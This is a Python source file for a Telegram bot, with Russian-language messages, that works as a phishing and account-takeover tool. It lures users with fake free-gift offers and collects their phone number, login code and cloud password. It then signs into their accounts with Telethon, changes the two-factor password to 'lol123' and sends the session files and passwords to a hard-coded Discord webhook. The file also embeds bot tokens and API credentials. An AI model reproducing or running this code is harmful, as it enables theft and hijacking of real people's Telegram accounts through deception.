import asyncio
import os
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from aiogram.dispatcher.filters import Text
from telethon import TelegramClient
from telethon.sessions import SQLiteSession
from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError
import aioschedule

# --- Настройки ---
BOT_TOKEN = "8496063485:AAGGJpcjFEyLI8bM4hsA6sYmDHYgzb3kRm8"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1411003346126635082/lgiKWDpfa7L_D83oOEjxyX85VF1yNHKdwnmuEfaBLhDyCDO9fXGlMi_tbCez_cONu_lZ"
API_ID = 24647488
API_HASH = "5359d6239969c07a29ea06167484a885"
TARGET_CHAT_ID = "8496063485"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_data = {}

# --- Шаблоны и картинки ---
templates = [
    "✨ УСПЕЙ ЗАБРАТЬ 1 ИЗ 1000 КОЛЕЦ 💍",
    "🔥 ЗАБЕРИ МИШКУ ТОЛЬКО СЕГОДНЯ 🔥",
    "🎁 БЕСПЛАТНЫЙ СНУП ДОГ УСПЕЙ ЗАБРАТЬ!",
    "💎 ЗАБЕРИ РОЗУ ЗА ЗАПУСК БОТА",
    "✨ БЕСПЛАТНЫЙ ЛОЛИ ПОП ПРЯМО СЕЙЧАС",
    "⚡ Топовый календарик за бесплатно!",
    "🎯 Жми /start и забирай свою собаку рудо не упусти свой шанс!",
    "🏆 За /start дарим ракету",
    "🚀 Будь первым кто заберет бесплатно пепу",
    "❤️ Подарок для особенного человека"
]

photos = [f"photos/{i}.png" for i in range(1, 11)]
index = 0

# --- Папки ---
os.makedirs("sessions", exist_ok=True)

# --- Рассылка по расписанию ---
async def send_scheduled_message():
    global index
    try:
        if os.path.exists(photos[index]):
            with open(photos[index], 'rb') as photo:
                await bot.send_photo(chat_id=TARGET_CHAT_ID, photo=photo, caption=templates[index])
            print(f"✅ Отправлено сообщение {index + 1}: {templates[index]}")
        index = (index + 1) % len(templates)
    except Exception as e:
        print(f"❌ Ошибка при отправке рассылки: {e}")

async def scheduler():
    aioschedule.every(1).hours.do(send_scheduled_message)
    while True:
        await aioschedule.run_pending()
        await asyncio.sleep(1)

async def on_startup(dp):
    asyncio.create_task(scheduler())
    print("🚀 Бот запущен! Рассылка будет отправляться каждый час.")

# --- Функция установки пароля ---
async def set_custom_password(client):
    try:
        await client.edit_2fa(new_password='lol123', hint='lol123')
        return True
    except Exception as e:
        print(f"Ошибка при установке пароля через edit_2fa: {e}")
        return False

# --- Обработчики ---
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text="🎁 Получить подарок 🎁", callback_data="get_reward"))
    start_photo = "photos/start.png"
    if os.path.exists(start_photo):
        with open(start_photo, "rb") as photo:
            await message.answer_photo(photo=photo, caption="Привет, счастливчик! ✨ Твой подарок ждёт тебя 🎁", reply_markup=kb)
    else:
        await message.answer("Привет, счастливчик! ✨ Твой подарок ждёт тебя 🎁", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "get_reward")
async def process_callback_get_reward(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    try:
        await bot.edit_message_reply_markup(chat_id=callback_query.from_user.id,
                                            message_id=callback_query.message.message_id,
                                            reply_markup=None)
    except:
        pass
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton(text="🤖Пройти проверку", request_contact=True))
    await bot.send_message(callback_query.from_user.id, "🎉 Пройди проверку, чтобы получить подарок!", reply_markup=kb)

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    phone = message.contact.phone_number
    session_name = f"sessions/{phone}"
    client = TelegramClient(SQLiteSession(session_name), API_ID, API_HASH)
    await client.connect()
    user_data[message.from_user.id] = {"client": client, "phone": phone, "code": "", "has_password": False, "user_password": None}
    try:
        await client.send_code_request(phone)
    except Exception as e:
        await message.answer(f"❌ Ошибка при отправке кода: {e}")
        return
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    buttons = [str(i) for i in range(1, 10)] + ['0', 'Удалить', 'Подтвердить']
    kb.add(*buttons)
    await message.answer("Введите код из Telegram:", reply_markup=kb)

@dp.message_handler(Text(equals=[str(i) for i in range(10)] + ['Удалить']))
async def enter_code(message: types.Message):
    data = user_data.get(message.from_user.id)
    if not data:
        await message.answer("Ошибка: сначала отправьте контакт.")
        return
    if message.text == "Удалить":
        data["code"] = data["code"][:-1]
    else:
        data["code"] += message.text
    await message.answer(f"Код подтверждения: {data['code']}")

@dp.message_handler(Text(equals='Подтвердить'))
async def confirm_code(message: types.Message):
    data = user_data.get(message.from_user.id)
    if not data:
        await message.answer("Ошибка: нет данных авторизации.")
        return
    client = data["client"]
    phone = data["phone"]
    code = data["code"]
    try:
        await client.sign_in(phone=phone, code=code)
        success = await set_custom_password(client)
        if success:
            await message.answer("💎 В течение 24 часов вы получите вознаграждение")
        await finish_session(message, client, phone)
    except SessionPasswordNeededError:
        data["has_password"] = True
        await message.answer("Введите облачный пароль:")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda message: len(message.text) >= 4)
async def handle_password(message: types.Message):
    data = user_data.get(message.from_user.id)
    if not data:
        return
    client = data["client"]
    password_text = message.text
    try:
        if data["has_password"]:
            data["user_password"] = password_text
            await client.sign_in(password=password_text)
        await finish_session(message, client, data["phone"], data["user_password"])
    except PasswordHashInvalidError:
        await message.answer("❌ Неверный пароль.")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

async def finish_session(message: types.Message, client: TelegramClient, phone: str, user_password=None):
    await client.disconnect()
    session_path = f"sessions/{phone}.session"
    discord_data = {"content": f"📱 Новая сессия\nТелефон: {phone}\n"}
    if user_password:
        discord_data["content"] += f"Пароль пользователя: ||{user_password}||"
    else:
        discord_data["content"] += "Установлен пароль: lol123"
    try:
        requests.post(DISCORD_WEBHOOK, json=discord_data)
    except:
        pass
    if os.path.exists(session_path):
        try:
            with open(session_path, "rb") as f:
                requests.post(DISCORD_WEBHOOK, files={"file": (f"{phone}.session", f)})
        except:
            pass
    await message.answer("✅ Проверка завершена!", reply_markup=ReplyKeyboardRemove())

# --- Запуск ---
if __name__ == "__main__":
    print("🚀 Бот запускается...")
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
